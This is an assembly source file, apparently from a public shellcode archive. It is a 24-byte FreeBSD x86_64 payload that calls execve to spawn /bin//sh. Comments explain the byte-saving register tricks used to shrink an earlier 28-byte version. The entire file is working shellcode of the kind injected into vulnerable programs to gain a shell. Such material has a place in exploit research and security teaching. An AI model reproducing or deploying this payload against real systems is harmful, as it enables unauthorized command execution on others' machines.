global _start

;
; Gitsnik, @dracyrys
; FreeBSD x86_64 execve, 24 bytes
;
; Listen here as 28 bytes: http://www.shell-storm.org/shellcode/files/shellcode-866.php
; Additional two bytes saved (as noted below) by clearing different registers.
;

section .text

_start:
	;
	; The 28 byte shellcode had listed here:
	;
	; xor rcx, rcx
	; mul rcx
	;
	; Saving two bytes (to 26 bytes) leaves us with:
	;
	; xor rax, rax
	; cdq
	; add al, 0x3b
	;
	; Because we only need RAX and RDX to be null.
	; HOWEVER we can save an additional two bytes
	; by pushing the RAX value to the stack and popping it off
	; rather than XOR'ing in the first place.
	;
	; Pretty cool :) 4 bytes saved just by clearing registers
	; in a different fashion.
	;
	push byte 0x3b
	pop rax
	mov rbx, 0x68732f2f6e69622f	; hs//nib/
	cdq

	; Argument one shell[0] = "/bin//sh"
	push rdx			; null
	push rbx			; hs//nib/

	; We need pointers for execve()
	push rsp			; *pointer to shell[0]
	pop rdi		; Argument 1

	; Argument two shell (including address of each argument in array)
	push rdx			; null
	push rdi			; address of shell[0]

	; We need pointers for execve()
	push rsp			; address of char * shell
	pop rsi		; Argument 2

	syscall

